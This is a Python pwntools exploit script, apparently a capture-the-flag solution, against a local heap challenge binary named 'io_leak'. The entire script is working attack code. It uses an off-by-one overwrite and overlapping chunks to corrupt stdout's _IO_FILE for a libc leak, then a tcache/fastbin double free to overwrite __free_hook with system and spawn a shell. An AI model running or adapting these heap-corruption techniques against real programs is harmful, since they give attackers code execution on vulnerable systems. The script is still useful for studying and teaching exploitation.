#!/usr/bin/env python2
# coding = utf-8

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('>>>\n')
    p.sendline(str(choice))

def add(id, len, content):
    send_choice(1)
    p.recvuntil('idx:\n')
    p.sendline(str(id))
    p.recvuntil('len:\n')
    p.sendline(str(len))
    p.recvuntil('content:\n')
    p.send(content)

def delete(id):
    send_choice(2)
    p.recvuntil('idx:\n')
    p.sendline(str(id))

def leak_libc():
    _IO_FLAG = 0xfbad3887
    add(0, 1, '\n')         # Chunk #0 to do offbyone
    add(1, 0x4f0, '\n')     # The Large Chunk #1 whose range in UnsortedBin and whose size will be modified
    add(2, 0xb0, '\n')      # The overlapped Chunk #2
    add(3, 0xb0, '\n')      # The chunk to gap between top chunk preventing from consolidating
    for i in range(7, 15):
        add(i, 0x60, '\n')     # Chunk #8 ~ #14 for future usage
    delete(2)               # Send Chunk #2 to TCache immediately or malloc fail sending after faking enlarged Chunk #1
    delete(0)               # Recreate the Chunk #0 to fake Chunk #1 's size to overlap original Chunk #2
    add(0, 0x18, '/bin/sh\x00' * 3 + '\xc1')
    delete(1)               # Send the unioned 0x5c0 size chunk to UnsortedBin
    add(1, 0x4f0, '\n')     # Split the Chunk #1 out, lefting Chunk #2 in sortedBin
                            # Currently Chunk #2 in both TCache & UnsortedBin! Leaked libc address in Chunk #2 's `fd` field.
    add(4, 0x60, '\x60\x47') # Write random Address of stdout in `fd` to allocate a next chunk on (maybe) _IO_FILE struct `stdout`, predication accuracy 1/16
    add(2, 0xb0, '\n')
    add(5, 0xb0, p64(_IO_FLAG) + p64(0) * 3 + '\x80')   # Write IO_FLAG & _IO_write_base's low byte to point to itself

elf = ELF('./io_leak')
# gdb.attach(p, '')

while True:
    try:
        p = process('./io_leak')
        leak_libc()
        stdout_IO_write_base = p.recvuntil('\x7f', timeout=0.5)
        if len(stdout_IO_write_base) != 0:
            break
    except Exception:
        p.close()
        continue

stdout = u64(stdout_IO_write_base.ljust(8, '\x00')) - 0x20
log.info('stdout: ' + hex(stdout))
libc = LibcSearcher('_IO_2_1_stdout_', stdout)
libc_base = stdout - libc.dump('_IO_2_1_stdout_')
system_libc = libc_base + libc.dump('system')
free_hook = libc_base + libc.dump('__free_hook')
log.info('libc_base: ' + hex(libc_base))
log.info('system_libc: ' + hex(system_libc))
log.info('free_hook: ' + hex(free_hook))

# gdb.attach(p, '')
for i in range(8, 15):
    delete(i)       # Fill TCache Bins to prevent from TCache double free detection
delete(2)           # FastBin Double Free
delete(7)
delete(4)
for i in range(8, 15):
    add(i, 0x60, '\n')     # Release TCache Bins
add(2, 0x60, p64(free_hook))    # TCache has no `size` field check, so we can write any address
add(7, 0x60, '\n')
add(4, 0x60, '\n')
add(6, 0x60, p64(system_libc))  # write `system` to `free_hook`
delete(0)                       # UserMem of Chunk #0 start with '/bin/sh\x00'
p.interactive()
